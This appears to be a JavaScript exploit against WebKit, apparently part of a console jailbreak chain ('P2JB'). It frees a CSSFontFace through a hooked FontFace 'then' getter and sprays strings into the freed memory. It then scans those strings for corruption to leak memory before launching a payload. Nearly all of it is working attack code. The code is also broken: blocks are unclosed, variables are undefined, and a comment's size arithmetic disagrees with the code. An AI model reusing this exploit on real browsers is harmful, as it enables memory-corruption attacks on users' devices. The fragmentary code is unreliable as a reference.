// ============================================================
// "Old Method" Info Leak via StringImpl Overlap

let spray = [];
let keep = [];
let uaf_strings = [];
const PAD = 0x22;
const FLUSH = 0x240;

function addPads() {
    const sheet = document.getElementById("s").sheet;
    for (let i = 0; i < PAD; i++)
        sheet.insertRule(`@font-face { font-family: pad${i}; src: url(nonexistent-pad-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
    void document.body.offsetTop;
}

function addFlushRules() {
    const st = document.createElement("style");
    st.id = "flush";
    document.head.appendChild(st);
    const sheet = st.sheet;
    for (let i = 0; i < FLUSH; i++)
        sheet.insertRule(`@font-face { font-family: flush${i}; src: url(nonexistent-flush-${i}.woff); unicode-range: U+E000; }`, sheet.cssRules.length);
    void document.body.offsetTop;
}

function deleteFlushRules() {
    const sheet = document.getElementById("flush").sheet;
    while (sheet.cssRules.length)
        sheet.deleteRule(0);
    void document.body.offsetTop;
}

function killFontFaceSetCache() {
    const f = new FontFace("cachekill" + keep.length, "local(Helvetica)", { unicodeRange: "U+E124" });
    document.fonts.add(f);
    keep.push(f);
}

// Create Strings of exactly 184 bytes (CSSFontFace size)
function makeStringImpl(index) {
    // 16-bit StringImpl header is ~20 bytes. 
    // We need string length of 82 to reach ~184 bytes allocation.
    // We use \u0000 (null bytes) so that if WebKit reads pointers from it, 
    // it reads NULL and handles it gracefully instead of OOMing.
    let base = "\u0000".repeat(70);
    let unique = "ID" + index; 
    while(unique.length < 12) unique += "X"; // Pad to exactly 12 chars
    
    // Total chars = 70 + 12 = 82 (164 bytes)
    return base + unique;
}

async function stringimpl_overlap(dangling_face) {
    alert("Phase 2: Scanning Strings for Overlap Corruption...");
    
    let corrupted_string = null;
    let corrupted_index = -1;

    for (let i = 0; i < uaf_strings.length; i++) {
        // Scan the first 70 characters looking for WebKit's status write
        let is_corrupted = false;
        for (let j = 0; j < 70; j++) {
            if (uaf_strings[i].charCodeAt(j) !== 0x0000) {
                is_corrupted = true;
                break;
            }
        }

        if (is_corrupted) {
            corrupted_string = uaf_strings[i];
            corrupted_index = i;
            break;
        }
    }

    if (!corrupted_string) {
        alert("FAILED -- StringImpl overlap failed. No strings were corrupted by WebKit.");
        return;
    }

    alert("SUCCESS! String at index " + corrupted_index + " was corrupted by WebKit!");
    
    // Attempting to read leaked data from the string
    let leak_data = "";
    for(let j = 0; j < 10; j++) {
        leak_data += corrupted_string.charCodeAt(j).toString(16) + " ";

    // The rest of the P2JB primitive builder would go here
    
    // Launch P2JB payload
    run_hax().catch(e => console.error("P2JB Error:", e));
}

window.onload = () => {

    document.fonts.add(trigger);
    void trigger.loaded;

    addPads();
    addFlushRules();

    let fired = false;
    Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        get() {
            if (!fired && this === trigger) {
                fired = true;
                const sheet = document.getElementById("s").sheet;
                killFontFaceSetCache();
                
                sheet.deleteRule(1); // FREE CSSFontFace
                void document.body.offsetTop;
                deleteFlushRules();

                for (let i = 0; i < 1000; i++) {

                    uaf_strings.push(str);

        }
    });

    document.fonts.load("1em trigger, x", "AB").then(faces => {
        keep.push(faces);
        stringimpl_overlap(faces[0]);
    });
};
